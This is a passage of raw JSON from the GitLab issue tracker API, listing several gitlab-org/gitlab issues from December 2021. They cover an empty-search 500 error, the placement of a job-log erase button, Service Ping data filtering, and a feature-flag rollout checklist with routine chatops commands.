(GitLab)","state":"active","avatar_url":"https://secure.gravatar.com/avatar/fb255c1e9c228b9356af165939b3ac9b?s=80\u0026d=identicon","web_url":"https://gitlab.com/nagyv-gitlab"},"type":"ISSUE","assignee":null,"user_notes_count":9,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347239","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":5,"completed_count":4},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"4 of 5 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347239","notes":"https://gitlab.com/api/v4/projects/278964/issues/347239/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347239/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347239","relative":"#347239","full":"gitlab-org/gitlab#347239"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7219,"epic":{"id":400265,"iid":7219,"title":"The agent should act as a CI/CD tunnel without configuration for Agent projects","url":"/groups/gitlab-org/-/epics/7219","group_id":9970,"human_readable_end_date":"Mar 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":98531947,"iid":347238,"project_id":278964,"title":"API searches with empty search parameter return 500 errors","description":"This will blow up:\nhttps://gitlab.com/api/v4/search?scope=projects\u0026search=\n\nQuestion: do we even want to execute a search if a user isn't even searching for something?\n\n\n```\nNoMethodError: undefined method `+' for nil:NilClass\n  from ee/lib/elastic/latest/project_class_proxy.rb:47:in `block in elastic_search'\n  from ee/lib/elastic/latest/query_context.rb:25:in `name'\n  from ee/lib/elastic/latest/project_class_proxy.rb:13:in `elastic_search'\n  from ee/lib/elastic/multi_version_util.rb:76:in `elastic_search'\n  from ee/app/models/concerns/elastic/application_versioned_search.rb:40:in `elastic_search'\n  from ee/lib/gitlab/elastic/search_results.rb:275:in `block in scope_results'\n  from lib/gitlab/utils/strong_memoize.rb:28:in `strong_memoize'\n  from ee/lib/gitlab/elastic/search_results.rb:274:in `scope_results'\n  from ee/lib/gitlab/elastic/search_results.rb:284:in `projects'\n  from ee/lib/gitlab/elastic/search_results.rb:33:in `objects'\n  from app/services/search_service.rb:70:in `search_objects'\n  from lib/api/search.rb:49:in `search'\n  from lib/api/search.rb:92:in `block (2 levels) in \u003cclass:Search\u003e'\n```","state":"closed","created_at":"2021-12-06T15:14:01.110Z","updated_at":"2022-05-30T16:00:19.060Z","closed_at":"2021-12-14T09:33:40.111Z","closed_by":{"id":5054237,"username":"dgruzd","name":"Dmitry Gruzd","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5054237/avatar.png","web_url":"https://gitlab.com/dgruzd"},"labels":["Category:Global Search","devops::data_stores","group::global search","section::enablement","type::bug"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":5054237,"username":"dgruzd","name":"Dmitry Gruzd","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5054237/avatar.png","web_url":"https://gitlab.com/dgruzd"}],"author":{"id":9717668,"username":"john-mason","name":"John Mason","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9717668/avatar.png","web_url":"https://gitlab.com/john-mason"},"type":"ISSUE","assignee":{"id":5054237,"username":"dgruzd","name":"Dmitry Gruzd","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5054237/avatar.png","web_url":"https://gitlab.com/dgruzd"},"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347238","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347238","notes":"https://gitlab.com/api/v4/projects/278964/issues/347238/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347238/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347238","relative":"#347238","full":"gitlab-org/gitlab#347238"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98531070,"iid":347237,"project_id":278964,"title":"Rethink the position of `erase job logs` button on job detail page","description":"\u003c!-- The first section \"Release notes\" is required if you want to have your release post blog MR auto generated. Currently in BETA, details on the **release post item generator** can be found in the handbook:  https://about.gitlab.com/handbook/marketing/blog/release-posts/#release-post-item-generator and this video: https://www.youtube.com/watch?v=rfn9ebgTwKg. The next four sections: \"Problem to solve\", \"Intended users\", \"User experience goal\", and \"Proposal\", are strongly recommended in your first draft, while the rest of the sections can be filled out during the problem validation or breakdown phase. However, keep in mind that providing complete and relevant information early helps our product team validate the problem and start working on a solution. --\u003e\n\n### Release notes\n\n\u003c!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). \" --\u003e\n\n### Problem to solve \nInstead of deleting only the log artifact, the `Erase logs` button is removing [more than that](https://gitlab.com/gitlab-org/gitlab/-/blob/733ba47f419bffd0e0d02dcbc7e30d9f7d2f2283/app/models/ci/build.rb#L802-809). And this behavior is documented for the API counterpart: https://docs.gitlab.com/ee/api/jobs.html#erase-a-job\n\nHowever, on the UI it is not clearly communicated what the users should really be expecting when erasing job logs. \n\nA small change was made to add a hover tooltip to clarify in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/75892 but placement should also be addressed.\n\n\u003c!-- What problem do we solve? Try to define the who/what/why of the opportunity as a user story. For example, \"As a (who), I want (what), so I can (why/value).\" --\u003e\n\n### Intended users\n\n\u003c!-- Who will use this feature? If known, include any of the following: types of users (e.g. Developer), personas, or specific company roles (e.g. Release Manager). It's okay to write \"Unknown\" and fill this field in later.\n\nPersonas are described at https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/\n\n* [Cameron (Compliance Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#cameron-compliance-manager)\n* [Parker (Product Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#parker-product-manager)\n* [Delaney (Development Team Lead)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#delaney-development-team-lead)\n* [Presley (Product Designer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#presley-product-designer)\n* [Sasha (Software Developer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sasha-software-developer)\n* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)\n* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)\n* [Sam (Security Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sam-security-analyst)\n* [Rachel (Release Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#rachel-release-manager)\n* [Alex (Security Operations Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#alex-security-operations-engineer)\n* [Simone (Software Engineer in Test)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#simone-software-engineer-in-test)\n* [Allison (Application Ops)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#allison-application-ops)\n* [Priyanka (Platform Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#priyanka-platform-engineer)\n* [Dana (Data Analyst)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#dana-data-analyst)\n* [Eddie (Content Editor)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#eddie-content-editor)\n--\u003e\n\n### Metrics \n\n\u003c!-- How are you going to track usage of this feature? Think about user behavior and their interaction with the product. What indicates someone is getting value from it?\n\nCreate tracking issue using the Snowplow event tracking template. See https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Snowplow%20event%20tracking.md\n\n--\u003e\n\n### User experience goal\n\nUsers should be aware of what an action would result into. \nhttps://gitlab.com/gitlab-org/gitlab/-/merge_requests/75892 does a good job at communicating to users about what all is deleted when they're clicking on the `Erase job logs` button. \n\n\n\u003c!-- What is the single user experience workflow this problem addresses?\nFor example, \"The user should be able to use the UI/API/.gitlab-ci.yml with GitLab to \u003cperform a specific task\u003e\"\nhttps://about.gitlab.com/handbook/engineering/ux/ux-research-training/user-story-mapping/ --\u003e\n\n\n### Proposal\n\nhttps://gitlab.com/gitlab-org/gitlab/-/issues/347237/designs/erase-job-logs.png\n\n1. move delete button next to retry job button\n1. replace retry button with an icon button\n1. retain the tooltip on the erase button\n\n\nhttps://gitlab.com/gitlab-org/gitlab/-/merge_requests/75892#note_753423489\n\u003c!-- How are we going to solve the problem? Try to include the user journey! https://about.gitlab.com/handbook/journeys/#user-journey --\u003e\n\n\n\n### Further details\n\n\u003c!-- Include use cases, benefits, goals, or any other details that will help us understand the problem better. --\u003e\n\n### Permissions and Security\n\n\u003c!-- What permissions are required to perform the described actions? Are they consistent with the existing permissions as documented for users, groups, and projects as appropriate? Is the proposed behavior consistent between the UI, API, and other access methods (e.g. email replies)?\nConsider adding checkboxes and expectations of users with certain levels of membership https://docs.gitlab.com/ee/user/permissions.html\n* [ ] Add expected impact to members with no access (0)\n* [ ] Add expected impact to Guest (10) members\n* [ ] Add expected impact to Reporter (20) members\n* [ ] Add expected impact to Developer (30) members\n* [ ] Add expected impact to Maintainer (40) members\n* [ ] Add expected impact to Owner (50) members --\u003e\n\n### Documentation\n\n\u003c!-- See the Feature Change Documentation Workflow https://docs.gitlab.com/ee/development/documentation/workflow.html#for-a-product-change\n\n* Add all known Documentation Requirements in this section. See https://docs.gitlab.com/ee/development/documentation/workflow.html\n* If this feature requires changing permissions, update the permissions document. See https://docs.gitlab.com/ee/user/permissions.html --\u003e\n\n### Availability \u0026 Testing\n\n\u003c!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.\n\nWhat risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?\n\nPlease list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.\n* Unit test changes\n* Integration test changes\n* End-to-end test change\n\nSee the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning --\u003e\n\n### Available Tier\n\n\u003c!-- This section should be used for setting the appropriate tier that this feature will belong to. Pricing can be found here: https://about.gitlab.com/pricing/\n\n* Free\n* Premium/Silver\n* Ultimate/Gold\n--\u003e\n\n### What does success look like, and how can we measure that?\n\n\u003c!--\nDefine both the success metrics and acceptance criteria. Note that success metrics indicate the desired business outcomes, while acceptance criteria indicate when the solution is working correctly. If there is no way to measure success, link to an issue that will implement a way to measure this.\n\nCreate tracking issue using the Snowplow event tracking template. See https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Snowplow%20event%20tracking.md\n--\u003e\n\n### What is the type of buyer?\n\n\u003c!-- What is the buyer persona for this feature? See https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/buyer-persona/\nIn which enterprise tier should this feature go? See https://about.gitlab.com/handbook/product/pricing/#three-tiers --\u003e\n\n### Is this a cross-stage feature?\n\n\u003c!-- Communicate if this change will affect multiple Stage Groups or product areas. We recommend always start with the assumption that a feature request will have an impact into another Group. Loop in the most relevant PM and Product Designer from that Group to provide strategic support to help align the Group's broader plan and vision, as well as to avoid UX and technical debt. https://about.gitlab.com/handbook/product/#cross-stage-features --\u003e\n\n### Links / references\n\n\u003c!-- Label reminders - you should have one of each of the following labels.\nUse the following resources to find the appropriate labels:\n- https://gitlab.com/gitlab-org/gitlab/-/labels\n- https://about.gitlab.com/handbook/product/categories/features/\n--\u003e\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e\n*This page may contain information related to upcoming products, features and functionality.\nIt is important to note that the information presented is for informational purposes only, so please do not rely on the information for purchasing or planning purposes.\nJust like with all projects, the items mentioned on the page are subject to change or delay, and the development, release, and timing of any products, features, or functionality remain at the sole discretion of GitLab Inc.*\n\u003c!-- triage-serverless v3 PLEASE DO NOT REMOVE THIS SECTION --\u003e","state":"closed","created_at":"2021-12-06T15:01:47.208Z","updated_at":"2022-02-28T17:01:33.996Z","closed_at":"2022-02-28T17:01:33.979Z","closed_by":{"id":4477803,"username":"pburdette","name":"Payton Burdette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4477803/avatar.png","web_url":"https://gitlab.com/pburdette"},"labels":["Category:Continuous Integration","Community contribution","GitLab Free","GitLab Premium","GitLab Ultimate","SUS::Impacting","Technical Writing","UI text","UX","UX debt","devops::verify","documentation","frontend","group::pipeline execution","section::ops","severity::3","type::feature","workflow::verification"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":4477803,"username":"pburdette","name":"Payton Burdette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4477803/avatar.png","web_url":"https://gitlab.com/pburdette"}],"author":{"id":6115425,"username":"v_mishra","name":"Veethika M","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f09a3a0badac17a57e28b4e18a45c1c0?s=80\u0026d=identicon","web_url":"https://gitlab.com/v_mishra"},"type":"ISSUE","assignee":{"id":4477803,"username":"pburdette","name":"Payton Burdette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4477803/avatar.png","web_url":"https://gitlab.com/pburdette"},"user_notes_count":20,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347237","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":6,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 6 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347237","notes":"https://gitlab.com/api/v4/projects/278964/issues/347237/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347237/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347237","relative":"#347237","full":"gitlab-org/gitlab#347237"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98529506,"iid":347235,"project_id":278964,"title":"Migrate invalid version-app Service Pings by filtering","description":"Related to #347234.\n\n## Summary \n\nAs we filter Service Pings with #347234 we also need to take care of already processed data. We need to migrate the data to also filter it and do not allow for metrics that don't exist.\n\n## TODO\n- [ ] Check how long we need to migrate the data back (issues started at the beginning of Nov)\n\n## Testing\n\nRun relevant tests before and after migration to see any discrepancies.","state":"closed","created_at":"2021-12-06T14:39:40.249Z","updated_at":"2022-08-04T14:32:20.902Z","closed_at":"2022-08-04T08:13:20.609Z","closed_by":{"id":1863977,"username":"michold","name":"Micha Wielich","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1863977/avatar.png","web_url":"https://gitlab.com/michold"},"labels":["Category:Service Ping","VersionApp","auto updated","backend","devops::analytics","group::product intelligence","missed:14.6","missed:14.7","missed:15.0","section::analytics","workflow::in dev"],"milestone":null,"assignees":[{"id":1863977,"username":"michold","name":"Micha Wielich","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1863977/avatar.png","web_url":"https://gitlab.com/michold"}],"author":{"id":3509693,"username":"nicolasdular","name":"Nicolas Dular","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c4a21f15150c12ddf13fd848597cddd9?s=80\u0026d=identicon","web_url":"https://gitlab.com/nicolasdular"},"type":"ISSUE","assignee":{"id":1863977,"username":"michold","name":"Micha Wielich","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1863977/avatar.png","web_url":"https://gitlab.com/michold"},"user_notes_count":19,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347235","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347235","notes":"https://gitlab.com/api/v4/projects/278964/issues/347235/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347235/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347235","relative":"#347235","full":"gitlab-org/gitlab#347235"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98529395,"iid":347234,"project_id":278964,"title":"Filter version-app Service Pings based on metric definition","description":"- Related issue: https://gitlab.com/gitlab-data/analytics/-/issues/10749\n- Meeting Agenda: https://docs.google.com/document/d/1rmXausbLHrxCjAthQzoU_U2OhlSzv52-9U8Thpt1f98/edit?usp=sharing\n\n## Summary\n\nWe allow Service Pings to be _any_ data right now. This causes dbt pipelines to fail. We need to be stricter in what we accept, without throwing away data. \n\n## How\n\nTo not throw away data, but still filter it down, we should\n1. Store the raw service ping payload\n1. Filter the service ping payload based on our metrics dictionary\n\nWe can use the [Service Data API](https://docs.gitlab.com/ee/api/usage_data.html#export-metric-definitions-as-a-single-yaml-file) to filter the data to only available data. This filtering should be done at the version-app level as it's the source of our dbt processes.\n\n## Why\n\nDbt pipelines fail, and this is causing problems for our data analysis and the data team.","state":"closed","created_at":"2021-12-06T14:37:54.395Z","updated_at":"2022-11-16T19:17:02.962Z","closed_at":"2022-03-11T15:38:11.190Z","closed_by":{"id":8013274,"username":"pskorupa","name":"Piotr Skorupa","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8013274/avatar.png","web_url":"https://gitlab.com/pskorupa"},"labels":["Unplanned","auto updated","backend","devops::growth","group::product intelligence","missed:14.6","missed:14.7","missed:14.8","section::growth","workflow::verification"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":8013274,"username":"pskorupa","name":"Piotr Skorupa","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8013274/avatar.png","web_url":"https://gitlab.com/pskorupa"}],"author":{"id":3509693,"username":"nicolasdular","name":"Nicolas Dular","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c4a21f15150c12ddf13fd848597cddd9?s=80\u0026d=identicon","web_url":"https://gitlab.com/nicolasdular"},"type":"ISSUE","assignee":{"id":8013274,"username":"pskorupa","name":"Piotr Skorupa","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8013274/avatar.png","web_url":"https://gitlab.com/pskorupa"},"user_notes_count":30,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/347234","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/347234","notes":"https://gitlab.com/api/v4/projects/278964/issues/347234/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/347234/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#347234","relative":"#347234","full":"gitlab-org/gitlab#347234"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":98526424,"iid":347226,"project_id":278964,"title":"[Feature flag] Rollout of ci_find_runners_by_ci_mirrors","description":"## Summary\n\nThis issue is to rollout [\"Fix `RunnersFinder#group_runners` cross-joining projects\"](https://gitlab.com/gitlab-org/gitlab/-/issues/336432) on production,\nthat is currently behind the `ci_find_runners_by_ci_mirrors` feature flag.\n\n- Related to: #336432, #336433, #342229.\n- Used MRs: !74900 \u0026 !77370\n\n## Owners\n\n- Team: ~\"group::runner\" \n- Most appropriate slack channel to reach out to: `#g_runner`\n- Best individual to reach out to: @furkanayhan \n- PM: NAME\n\n## Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## Expectations\n\n### What are we expecting to happen?\n\nWe are expecting that some methods of `Ci::RunnersFinder`, `Analytics::DevopsAdoption:SnapshotCalculator` and `API::Ci::Runners` will start using the new ci-mirror tables instead of cross-joining.\n\n### When is the feature viable?\n\n\u003c!-- What are the settings we need to configure in order to have this feature viable? --\u003e\n\n\u003c!-- \nExample below:\n \n1. Enable service ping collection\n   `ApplicationSetting.first.update(usage_ping_enabled: true)`\n--\u003e\n\n### What might happen if this goes wrong?\n\nWe can disable the feature flag.\n\n### What can we monitor to detect problems with this?\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant? --\u003e\n_Consider mentioning checks for 5xx errors or other anomalies like an increase in redirects \n(302 HTTP response status)_\n\n### What can we check for monitoring production after rollouts?\n\n**Response times:**\n\n- `/api/:version/groups/:id/runners` =\u003e https://log.gprd.gitlab.net/goto/be534aa0-7d2e-11ec-9dd2-93d354bef8e7\n\n**Error rates:**\n\n- `/api/:version/groups/:id/runners` =\u003e https://log.gprd.gitlab.net/goto/6ef72120-7d2e-11ec-a649-b7cbb8e4f62e\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [x] Enable the feature globally on non-production environments.\n    - [x] `/chatops run feature set ci_find_runners_by_ci_mirrors true --dev`\n    - [x] `/chatops run feature set ci_find_runners_by_ci_mirrors true --staging`\n- [ ] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab ci_find_runners_by_ci_mirrors true`\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab-foss ci_find_runners_by_ci_mirrors true`\n    - [ ] `/chatops run feature set --project=gitlab-com/www-gitlab-com ci_find_runners_by_ci_mirrors true`\n- If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --group=gitlab-org ci_find_runners_by_ci_mirrors true`\n    - [ ] `/chatops run feature set --group=gitlab-com ci_find_runners_by_ci_mirrors true`\n- If you're using [user-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --user=\u003cyour-username\u003e ci_find_runners_by_ci_mirrors true`\n- [ ] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [ ] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [ ] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [ ] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [ ] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [x] `/chatops run feature set ci_find_runners_by_ci_mirrors \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set ci_find_runners_by_ci_mirrors \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [x] `/chatops run feature set ci_find_runners_by_ci_mirrors true`\n- [ ] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `ci_find_runners_by_ci_mirrors`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `ci_find_runners_by_ci_mirrors` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [x] `/chatops run feature delete ci_find_runners_by_ci_mirrors --dev`\n    - [x] `/chatops run feature delete ci_find_runners_by_ci_mirrors --staging`\n    - [x] `/chatops run feature delete ci_find_runners_by_ci_mirrors`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set 